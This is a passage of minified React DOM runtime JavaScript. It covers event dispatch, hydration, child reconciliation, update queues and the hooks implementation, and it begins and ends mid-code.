e;if((v||g)&&(g=f.window===f?f:(g=f.ownerDocument)?g.defaultView||g.parentWindow:window,v?(A=n.relatedTarget||n.toElement,v=h,A=A?Er(A):null,A!==null&&(N=zr(A),A!==N||A.tag!==5&&A.tag!==6)&&(A=null)):(v=null,A=h),v!==A)){if(k=Gp,V="onMouseLeave",S="onMouseEnter",_="mouse",(t==="pointerout"||t==="pointerover")&&(k=Qp,V="onPointerLeave",S="onPointerEnter",_="pointer"),N=v==null?g:si(v),R=A==null?g:si(A),g=new k(V,_+"leave",v,n,f),g.target=N,g.relatedTarget=R,V=null,Er(f)===h&&(k=new k(S,_+"enter",A,n,f),k.target=R,k.relatedTarget=N,V=k),N=V,v&&A)t:{for(k=v,S=A,_=0,R=k;R;R=Yr(R))_++;for(R=0,V=S;V;V=Yr(V))R++;for(;0<_-R;)k=Yr(k),_--;for(;0<R-_;)S=Yr(S),R--;for(;_--;){if(k===S||S!==null&&k===S.alternate)break t;k=Yr(k),S=Yr(S)}k=null}else k=null;v!==null&&om(p,g,v,k,!1),A!==null&&N!==null&&om(p,N,A,k,!0)}}e:{if(g=h?si(h):window,v=g.nodeName&&g.nodeName.toLowerCase(),v==="select"||v==="input"&&g.type==="file")var U=sI;else if(Jp(g))if(sv)U=uI;else{U=aI;var j=oI}else(v=g.nodeName)&&v.toLowerCase()==="input"&&(g.type==="checkbox"||g.type==="radio")&&(U=lI);if(U&&(U=U(t,h))){iv(p,U,n,f);break e}j&&j(t,g,h),t==="focusout"&&(j=g._wrapperState)&&j.controlled&&g.type==="number"&&kc(g,"number",g.value)}switch(j=h?si(h):window,t){case"focusin":(Jp(j)||j.contentEditable==="true")&&(ri=j,zc=h,Ns=null);break;case"focusout":Ns=zc=ri=null;break;case"mousedown":Bc=!0;break;case"contextmenu":case"mouseup":case"dragend":Bc=!1,rm(p,n,f);break;case"selectionchange":if(dI)break;case"keydown":case"keyup":rm(p,n,f)}var I;if(sd)e:{switch(t){case"compositionstart":var y="onCompositionStart";break e;case"compositionend":y="onCompositionEnd";break e;case"compositionupdate":y="onCompositionUpdate";break e}y=void 0}else ni?nv(t,n)&&(y="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(y="onCompositionStart");y&&(tv&&n.locale!=="ko"&&(ni||y!=="onCompositionStart"?y==="onCompositionEnd"&&ni&&(I=ev()):(Bn=f,nd="value"in Bn?Bn.value:Bn.textContent,ni=!0)),j=Ya(h,y),0<j.length&&(y=new Kp(y,t,null,n,f),p.push({event:y,listeners:j}),I?y.data=I:(I=rv(n),I!==null&&(y.data=I)))),(I=eI?tI(t,n):nI(t,n))&&(h=Ya(h,"onBeforeInput"),0<h.length&&(f=new Kp("onBeforeInput","beforeinput",null,n,f),p.push({event:f,listeners:h}),f.data=I))}mv(p,e)})}function Ys(t,e,n){return{instance:t,listener:e,currentTarget:n}}function Ya(t,e){for(var n=e+"Capture",r=[];t!==null;){var i=t,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=$s(t,n),s!=null&&r.unshift(Ys(t,s,i)),s=$s(t,e),s!=null&&r.push(Ys(t,s,i))),t=t.return}return r}function Yr(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function om(t,e,n,r,i){for(var s=e._reactName,o=[];n!==null&&n!==r;){var l=n,u=l.alternate,h=l.stateNode;if(u!==null&&u===r)break;l.tag===5&&h!==null&&(l=h,i?(u=$s(n,s),u!=null&&o.unshift(Ys(n,u,l))):i||(u=$s(n,s),u!=null&&o.push(Ys(n,u,l)))),n=n.return}o.length!==0&&t.push({event:e,listeners:o})}var gI=/\r\n?/g,yI=/\u0000|\uFFFD/g;function am(t){return(typeof t=="string"?t:""+t).replace(gI,`
`).replace(yI,"")}function ua(t,e,n){if(e=am(e),am(t)!==e&&n)throw Error(M(425))}function Xa(){}var $c=null,Wc=null;function qc(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Hc=typeof setTimeout=="function"?setTimeout:void 0,vI=typeof clearTimeout=="function"?clearTimeout:void 0,lm=typeof Promise=="function"?Promise:void 0,_I=typeof queueMicrotask=="function"?queueMicrotask:typeof lm<"u"?function(t){return lm.resolve(null).then(t).catch(wI)}:Hc;function wI(t){setTimeout(function(){throw t})}function Xu(t,e){var n=e,r=0;do{var i=n.nextSibling;if(t.removeChild(n),i&&i.nodeType===8)if(n=i.data,n==="/$"){if(r===0){t.removeChild(i),Hs(e);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=i}while(n);Hs(e)}function Yn(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function um(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var zi=Math.random().toString(36).slice(2),Kt="__reactFiber$"+zi,Xs="__reactProps$"+zi,_n="__reactContainer$"+zi,Gc="__reactEvents$"+zi,EI="__reactListeners$"+zi,TI="__reactHandles$"+zi;function Er(t){var e=t[Kt];if(e)return e;for(var n=t.parentNode;n;){if(e=n[_n]||n[Kt]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=um(t);t!==null;){if(n=t[Kt])return n;t=um(t)}return e}t=n,n=t.parentNode}return null}function vo(t){return t=t[Kt]||t[_n],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function si(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(M(33))}function Ol(t){return t[Xs]||null}var Kc=[],oi=-1;function hr(t){return{current:t}}function ve(t){0>oi||(t.current=Kc[oi],Kc[oi]=null,oi--)}function fe(t,e){oi++,Kc[oi]=t.current,t.current=e}var or={},et=hr(or),pt=hr(!1),Pr=or;function Si(t,e){var n=t.type.contextTypes;if(!n)return or;var r=t.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in n)i[s]=e[s];return r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=i),i}function mt(t){return t=t.childContextTypes,t!=null}function Ja(){ve(pt),ve(et)}function cm(t,e,n){if(et.current!==or)throw Error(M(168));fe(et,e),fe(pt,n)}function yv(t,e,n){var r=t.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error(M(108,oT(t)||"Unknown",i));return Te({},n,r)}function Za(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||or,Pr=et.current,fe(et,t),fe(pt,pt.current),!0}function hm(t,e,n){var r=t.stateNode;if(!r)throw Error(M(169));n?(t=yv(t,e,Pr),r.__reactInternalMemoizedMergedChildContext=t,ve(pt),ve(et),fe(et,t)):ve(pt),fe(pt,n)}var cn=null,Ll=!1,Ju=!1;function vv(t){cn===null?cn=[t]:cn.push(t)}function II(t){Ll=!0,vv(t)}function dr(){if(!Ju&&cn!==null){Ju=!0;var t=0,e=ue;try{var n=cn;for(ue=1;t<n.length;t++){var r=n[t];do r=r(!0);while(r!==null)}cn=null,Ll=!1}catch(i){throw cn!==null&&(cn=cn.slice(t+1)),$y(Jh,dr),i}finally{ue=e,Ju=!1}}return null}var ai=[],li=0,el=null,tl=0,Rt=[],xt=0,Nr=null,hn=1,dn="";function vr(t,e){ai[li++]=tl,ai[li++]=el,el=t,tl=e}function _v(t,e,n){Rt[xt++]=hn,Rt[xt++]=dn,Rt[xt++]=Nr,Nr=t;var r=hn;t=dn;var i=32-zt(r)-1;r&=~(1<<i),n+=1;var s=32-zt(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,hn=1<<32-zt(e)+i|n<<i|r,dn=s+t}else hn=1<<s|n<<i|r,dn=t}function ad(t){t.return!==null&&(vr(t,1),_v(t,1,0))}function ld(t){for(;t===el;)el=ai[--li],ai[li]=null,tl=ai[--li],ai[li]=null;for(;t===Nr;)Nr=Rt[--xt],Rt[xt]=null,dn=Rt[--xt],Rt[xt]=null,hn=Rt[--xt],Rt[xt]=null}var Tt=null,wt=null,_e=!1,Ut=null;function wv(t,e){var n=kt(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function dm(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,Tt=t,wt=Yn(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,Tt=t,wt=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=Nr!==null?{id:hn,overflow:dn}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=kt(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,Tt=t,wt=null,!0):!1;default:return!1}}function Qc(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Yc(t){if(_e){var e=wt;if(e){var n=e;if(!dm(t,e)){if(Qc(t))throw Error(M(418));e=Yn(n.nextSibling);var r=Tt;e&&dm(t,e)?wv(r,n):(t.flags=t.flags&-4097|2,_e=!1,Tt=t)}}else{if(Qc(t))throw Error(M(418));t.flags=t.flags&-4097|2,_e=!1,Tt=t}}}function fm(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;Tt=t}function ca(t){if(t!==Tt)return!1;if(!_e)return fm(t),_e=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!qc(t.type,t.memoizedProps)),e&&(e=wt)){if(Qc(t))throw Ev(),Error(M(418));for(;e;)wv(t,e),e=Yn(e.nextSibling)}if(fm(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(M(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){wt=Yn(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}wt=null}}else wt=Tt?Yn(t.stateNode.nextSibling):null;return!0}function Ev(){for(var t=wt;t;)t=Yn(t.nextSibling)}function Ai(){wt=Tt=null,_e=!1}function ud(t){Ut===null?Ut=[t]:Ut.push(t)}var SI=Rn.ReactCurrentBatchConfig;function fs(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(M(309));var r=n.stateNode}if(!r)throw Error(M(147,t));var i=r,s=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var l=i.refs;o===null?delete l[s]:l[s]=o},e._stringRef=s,e)}if(typeof t!="string")throw Error(M(284));if(!n._owner)throw Error(M(290,t))}return t}function ha(t,e){throw t=Object.prototype.toString.call(e),Error(M(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function pm(t){var e=t._init;return e(t._payload)}function Tv(t){function e(S,_){if(t){var R=S.deletions;R===null?(S.deletions=[_],S.flags|=16):R.push(_)}}function n(S,_){if(!t)return null;for(;_!==null;)e(S,_),_=_.sibling;return null}function r(S,_){for(S=new Map;_!==null;)_.key!==null?S.set(_.key,_):S.set(_.index,_),_=_.sibling;return S}function i(S,_){return S=er(S,_),S.index=0,S.sibling=null,S}function s(S,_,R){return S.index=R,t?(R=S.alternate,R!==null?(R=R.index,R<_?(S.flags|=2,_):R):(S.flags|=2,_)):(S.flags|=1048576,_)}function o(S){return t&&S.alternate===null&&(S.flags|=2),S}function l(S,_,R,V){return _===null||_.tag!==6?(_=sc(R,S.mode,V),_.return=S,_):(_=i(_,R),_.return=S,_)}function u(S,_,R,V){var U=R.type;return U===ti?f(S,_,R.props.children,V,R.key):_!==null&&(_.elementType===U||typeof U=="object"&&U!==null&&U.$$typeof===Vn&&pm(U)===_.type)?(V=i(_,R.props),V.ref=fs(S,_,R),V.return=S,V):(V=ba(R.type,R.key,R.props,null,S.mode,V),V.ref=fs(S,_,R),V.return=S,V)}function h(S,_,R,V){return _===null||_.tag!==4||_.stateNode.containerInfo!==R.containerInfo||_.stateNode.implementation!==R.implementation?(_=oc(R,S.mode,V),_.return=S,_):(_=i(_,R.children||[]),_.return=S,_)}function f(S,_,R,V,U){return _===null||_.tag!==7?(_=Cr(R,S.mode,V,U),_.return=S,_):(_=i(_,R),_.return=S,_)}function p(S,_,R){if(typeof _=="string"&&_!==""||typeof _=="number")return _=sc(""+_,S.mode,R),_.return=S,_;if(typeof _=="object"&&_!==null){switch(_.$$typeof){case ea:return R=ba(_.type,_.key,_.props,null,S.mode,R),R.ref=fs(S,null,_),R.return=S,R;case ei:return _=oc(_,S.mode,R),_.return=S,_;case Vn:var V=_._init;return p(S,V(_._payload),R)}if(vs(_)||ls(_))return _=Cr(_,S.mode,R,null),_.return=S,_;ha(S,_)}return null}function g(S,_,R,V){var U=_!==null?_.key:null;if(typeof R=="string"&&R!==""||typeof R=="number")return U!==null?null:l(S,_,""+R,V);if(typeof R=="object"&&R!==null){switch(R.$$typeof){case ea:return R.key===U?u(S,_,R,V):null;case ei:return R.key===U?h(S,_,R,V):null;case Vn:return U=R._init,g(S,_,U(R._payload),V)}if(vs(R)||ls(R))return U!==null?null:f(S,_,R,V,null);ha(S,R)}return null}function v(S,_,R,V,U){if(typeof V=="string"&&V!==""||typeof V=="number")return S=S.get(R)||null,l(_,S,""+V,U);if(typeof V=="object"&&V!==null){switch(V.$$typeof){case ea:return S=S.get(V.key===null?R:V.key)||null,u(_,S,V,U);case ei:return S=S.get(V.key===null?R:V.key)||null,h(_,S,V,U);case Vn:var j=V._init;return v(S,_,R,j(V._payload),U)}if(vs(V)||ls(V))return S=S.get(R)||null,f(_,S,V,U,null);ha(_,V)}return null}function A(S,_,R,V){for(var U=null,j=null,I=_,y=_=0,T=null;I!==null&&y<R.length;y++){I.index>y?(T=I,I=null):T=I.sibling;var C=g(S,I,R[y],V);if(C===null){I===null&&(I=T);break}t&&I&&C.alternate===null&&e(S,I),_=s(C,_,y),j===null?U=C:j.sibling=C,j=C,I=T}if(y===R.length)return n(S,I),_e&&vr(S,y),U;if(I===null){for(;y<R.length;y++)I=p(S,R[y],V),I!==null&&(_=s(I,_,y),j===null?U=I:j.sibling=I,j=I);return _e&&vr(S,y),U}for(I=r(S,I);y<R.length;y++)T=v(I,S,y,R[y],V),T!==null&&(t&&T.alternate!==null&&I.delete(T.key===null?y:T.key),_=s(T,_,y),j===null?U=T:j.sibling=T,j=T);return t&&I.forEach(function(P){return e(S,P)}),_e&&vr(S,y),U}function k(S,_,R,V){var U=ls(R);if(typeof U!="function")throw Error(M(150));if(R=U.call(R),R==null)throw Error(M(151));for(var j=U=null,I=_,y=_=0,T=null,C=R.next();I!==null&&!C.done;y++,C=R.next()){I.index>y?(T=I,I=null):T=I.sibling;var P=g(S,I,C.value,V);if(P===null){I===null&&(I=T);break}t&&I&&P.alternate===null&&e(S,I),_=s(P,_,y),j===null?U=P:j.sibling=P,j=P,I=T}if(C.done)return n(S,I),_e&&vr(S,y),U;if(I===null){for(;!C.done;y++,C=R.next())C=p(S,C.value,V),C!==null&&(_=s(C,_,y),j===null?U=C:j.sibling=C,j=C);return _e&&vr(S,y),U}for(I=r(S,I);!C.done;y++,C=R.next())C=v(I,S,y,C.value,V),C!==null&&(t&&C.alternate!==null&&I.delete(C.key===null?y:C.key),_=s(C,_,y),j===null?U=C:j.sibling=C,j=C);return t&&I.forEach(function(x){return e(S,x)}),_e&&vr(S,y),U}function N(S,_,R,V){if(typeof R=="object"&&R!==null&&R.type===ti&&R.key===null&&(R=R.props.children),typeof R=="object"&&R!==null){switch(R.$$typeof){case ea:e:{for(var U=R.key,j=_;j!==null;){if(j.key===U){if(U=R.type,U===ti){if(j.tag===7){n(S,j.sibling),_=i(j,R.props.children),_.return=S,S=_;break e}}else if(j.elementType===U||typeof U=="object"&&U!==null&&U.$$typeof===Vn&&pm(U)===j.type){n(S,j.sibling),_=i(j,R.props),_.ref=fs(S,j,R),_.return=S,S=_;break e}n(S,j);break}else e(S,j);j=j.sibling}R.type===ti?(_=Cr(R.props.children,S.mode,V,R.key),_.return=S,S=_):(V=ba(R.type,R.key,R.props,null,S.mode,V),V.ref=fs(S,_,R),V.return=S,S=V)}return o(S);case ei:e:{for(j=R.key;_!==null;){if(_.key===j)if(_.tag===4&&_.stateNode.containerInfo===R.containerInfo&&_.stateNode.implementation===R.implementation){n(S,_.sibling),_=i(_,R.children||[]),_.return=S,S=_;break e}else{n(S,_);break}else e(S,_);_=_.sibling}_=oc(R,S.mode,V),_.return=S,S=_}return o(S);case Vn:return j=R._init,N(S,_,j(R._payload),V)}if(vs(R))return A(S,_,R,V);if(ls(R))return k(S,_,R,V);ha(S,R)}return typeof R=="string"&&R!==""||typeof R=="number"?(R=""+R,_!==null&&_.tag===6?(n(S,_.sibling),_=i(_,R),_.return=S,S=_):(n(S,_),_=sc(R,S.mode,V),_.return=S,S=_),o(S)):n(S,_)}return N}var Ci=Tv(!0),Iv=Tv(!1),nl=hr(null),rl=null,ui=null,cd=null;function hd(){cd=ui=rl=null}function dd(t){var e=nl.current;ve(nl),t._currentValue=e}function Xc(t,e,n){for(;t!==null;){var r=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),t===n)break;t=t.return}}function yi(t,e){rl=t,cd=ui=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(ft=!0),t.firstContext=null)}function Dt(t){var e=t._currentValue;if(cd!==t)if(t={context:t,memoizedValue:e,next:null},ui===null){if(rl===null)throw Error(M(308));ui=t,rl.dependencies={lanes:0,firstContext:t}}else ui=ui.next=t;return e}var Tr=null;function fd(t){Tr===null?Tr=[t]:Tr.push(t)}function Sv(t,e,n,r){var i=e.interleaved;return i===null?(n.next=n,fd(e)):(n.next=i.next,i.next=n),e.interleaved=n,wn(t,r)}function wn(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var On=!1;function pd(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Av(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function gn(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function Xn(t,e,n){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,oe&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,wn(t,n)}return i=r.interleaved,i===null?(e.next=e,fd(r)):(e.next=i.next,i.next=e),r.interleaved=e,wn(t,n)}function Ra(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,Zh(t,n)}}function mm(t,e){var n=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,s=null;if(n=n.firstBaseUpdate,n!==null){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};s===null?i=s=o:s=s.next=o,n=n.next}while(n!==null);s===null?i=s=e:s=s.next=e}else i=s=e;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function il(t,e,n,r){var i=t.updateQueue;On=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,l=i.shared.pending;if(l!==null){i.shared.pending=null;var u=l,h=u.next;u.next=null,o===null?s=h:o.next=h,o=u;var f=t.alternate;f!==null&&(f=f.updateQueue,l=f.lastBaseUpdate,l!==o&&(l===null?f.firstBaseUpdate=h:l.next=h,f.lastBaseUpdate=u))}if(s!==null){var p=i.baseState;o=0,f=h=u=null,l=s;do{var g=l.lane,v=l.eventTime;if((r&g)===g){f!==null&&(f=f.next={eventTime:v,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var A=t,k=l;switch(g=e,v=n,k.tag){case 1:if(A=k.payload,typeof A=="function"){p=A.call(v,p,g);break e}p=A;break e;case 3:A.flags=A.flags&-65537|128;case 0:if(A=k.payload,g=typeof A=="function"?A.call(v,p,g):A,g==null)break e;p=Te({},p,g);break e;case 2:On=!0}}l.callback!==null&&l.lane!==0&&(t.flags|=64,g=i.effects,g===null?i.effects=[l]:g.push(l))}else v={eventTime:v,lane:g,tag:l.tag,payload:l.payload,callback:l.callback,next:null},f===null?(h=f=v,u=p):f=f.next=v,o|=g;if(l=l.next,l===null){if(l=i.shared.pending,l===null)break;g=l,l=g.next,g.next=null,i.lastBaseUpdate=g,i.shared.pending=null}}while(!0);if(f===null&&(u=p),i.baseState=u,i.firstBaseUpdate=h,i.lastBaseUpdate=f,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);br|=o,t.lanes=o,t.memoizedState=p}}function gm(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var r=t[e],i=r.callback;if(i!==null){if(r.callback=null,r=n,typeof i!="function")throw Error(M(191,i));i.call(r)}}}var _o={},Yt=hr(_o),Js=hr(_o),Zs=hr(_o);function Ir(t){if(t===_o)throw Error(M(174));return t}function md(t,e){switch(fe(Zs,e),fe(Js,t),fe(Yt,_o),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Nc(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Nc(e,t)}ve(Yt),fe(Yt,e)}function Ri(){ve(Yt),ve(Js),ve(Zs)}function Cv(t){Ir(Zs.current);var e=Ir(Yt.current),n=Nc(e,t.type);e!==n&&(fe(Js,t),fe(Yt,n))}function gd(t){Js.current===t&&(ve(Yt),ve(Js))}var we=hr(0);function sl(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Zu=[];function yd(){for(var t=0;t<Zu.length;t++)Zu[t]._workInProgressVersionPrimary=null;Zu.length=0}var xa=Rn.ReactCurrentDispatcher,ec=Rn.ReactCurrentBatchConfig,Dr=0,Ee=null,De=null,Oe=null,ol=!1,Ds=!1,eo=0,AI=0;function Ke(){throw Error(M(321))}function vd(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!$t(t[n],e[n]))return!1;return!0}function _d(t,e,n,r,i,s){if(Dr=s,Ee=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,xa.current=t===null||t.memoizedState===null?kI:PI,t=n(r,i),Ds){s=0;do{if(Ds=!1,eo=0,25<=s)throw Error(M(301));s+=1,Oe=De=null,e.updateQueue=null,xa.current=NI,t=n(r,i)}while(Ds)}if(xa.current=al,e=De!==null&&De.next!==null,Dr=0,Oe=De=Ee=null,ol=!1,e)throw Error(M(300));return t}function wd(){var t=eo!==0;return eo=0,t}function Gt(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Oe===null?Ee.memoizedState=Oe=t:Oe=Oe.next=t,Oe}function bt(){if(De===null){var t=Ee.alternate;t=t!==null?t.memoizedState:null}else t=De.next;var e=Oe===null?Ee.memoizedState:Oe.next;if(e!==null)Oe=e,De=t;else{if(t===null)throw Error(M(310));De=t,t={memoizedState:De.memoizedState,baseState:De.baseState,baseQueue:De.baseQueue,queue:De.queue,next:null},Oe===null?Ee.memoizedState=Oe=t:Oe=Oe.next=t}return Oe}function to(t,e){return typeof e=="function"?e(t):e}function tc(t){var e=bt(),n=e.queue;if(n===null)throw Error(M(311));n.lastRenderedReducer=t;var r=De,i=r.baseQueue,s=n.pending;if(s!==null){if(i!==null){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,n.pending=null}if(i!==null){s=i.next,r=r.baseState;var l=o=null,u=null,h=s;do{var f=h.lane;if((Dr&f)===f)u!==null&&(u=u.next={lane:0,action:h.action,hasEagerState:h.hasEagerState,eagerState:h.eagerState,next:null}),r=h.hasEagerState?h.eagerState:t(r,h.action);else{var p={lane:f,action:h.action,hasEagerState:h.hasEagerState,eagerState:h.eagerState,next:null};u===null?(l=u=p,o=r):u=u.next=p,Ee.lanes|=f,br|=f}h=h.next}while(h!==null&&h!==s);u===null?o=r:u.next=l,$t(r,e.memoizedState)||(ft=!0),e.memoizedState=r,e.baseState=o,e.baseQueue=u,n.lastRenderedState=r}if(t=n.interleaved,t!==null){i=t;do s=i.lane,Ee.lanes|=s,br|=s,i=i.next;while(i!==t)}else i===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function nc(t){var e=bt(),n=e.queue;if(n===null)throw Error(M(311));n.lastRenderedReducer=t;var r=n.dispatch,i=n.pending,s=e.memoizedState;if(i!==null){n.pending=null;var o=i=i.next;do s=t(s,o.action),o=o.next;while(o!==i);$t(s,e.memoizedState)||(ft=!0),e.memoizedState=s,e.baseQueue===null&&(e.baseState=s),n.lastRenderedState=s}return[s,r]}function Rv(){}function xv(t,e){var n=Ee,r=bt(),i=e(),s=!$t(r.memoizedState,i);if(s&&(r.memoizedState=i,ft=!0),r=r.queue,Ed(Nv.bind(null,n,r,t),[t]),r.getSnapshot!==e||s||Oe!==null&&Oe.memoizedState.tag&1){if(n.flags|=2048,no(9,Pv.bind(null,n,r,i,e),void 0,null),Le===null)throw Error(M(349));Dr&30||kv(n,e,i)}return i}function kv(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=Ee.updateQueue,e===null?(e={lastEffect:null,stores:null},Ee.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function Pv(t,e,n,r){e.value=n,e.getSnapshot=r,Dv(e)&&bv(t)}function Nv(t,e,n){return n(function(){Dv(e)&&bv(t)})}function Dv(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!$t(t,n)}catch{return!0}}function bv(t){var e=wn(t,1);e!==null&&Bt(e,t,1,-1)}function ym(t){var e=Gt();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:to,lastRenderedState:t},e.queue=t,t=t.dispatch=xI.bind(null,Ee,t),[e.memoizedState,t]}function no(t,e,n,r){return t={tag:t,create:e,destroy:n,deps:r,next:null},e=Ee.updateQueue,e===null?(e={lastEffect:null,stores:null},Ee.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(r=n.next,n.next=t,t.next=r,e.lastEffect=t)),t}function Vv(){return bt().memoizedState}function ka(t,e,n,r){var i=Gt();Ee.flags|=t,i.memoizedState=no(1|e,n,void 0,r===void 0?null:r)}function Ml(t,e,n,r){var i=bt();r=r===void 0?null:r;var s=void 0;if(De!==null){var o=De.memoizedState;if(s=o.destroy,r!==null&&vd(r,o.deps)){i.memoizedState=no(e,n,s,r);return}}Ee.flags|=t,i.memoizedState=no(1|e,n,s,r)}function vm(t,e){return ka(8390656,8,t,e)}function Ed(t,e){return Ml(2048,8,t,e)}function Ov(t,e){return Ml(4,2,t,e)}function Lv(t,e){return Ml(4,4,t,e)}function Mv(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function Fv(t,e,n){return n=n!=null?n.concat([t]):null,Ml(4,4,Mv.bind(null,e,t),n)}function Td(){}function Uv(t,e){var n=bt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&vd(e,r[1])?r[0]:(n.memoizedState=[t,e],t)}function jv(t,e){var n=bt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&vd(e,r[1])?r[0]:(t=t(),n.memoizedState=[t,e],t)}function zv(t,e,n){return Dr&21?($t(n,e)||(n=Hy(),Ee.lanes|=n,br|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,ft=!0),t.memoizedState=n)}function CI(t,e){var n=ue;ue=n!==0&&4>n?n:4,t(!0);var r=ec.transition;ec.transition={};try{t(!1),e()}finally{ue=n,ec.transition=r}}function Bv(){return bt().memoizedState}function RI(t,e,n){var r=Zn(t);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},$v(t))Wv(e,n);else if(n=Sv(t,e,n,r),n!==null){var i=st();Bt(n,t,r,i),qv(n,e,r)}}function xI(t,e,n){var r=Zn(t),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if($v(t))Wv(e,i);else{var 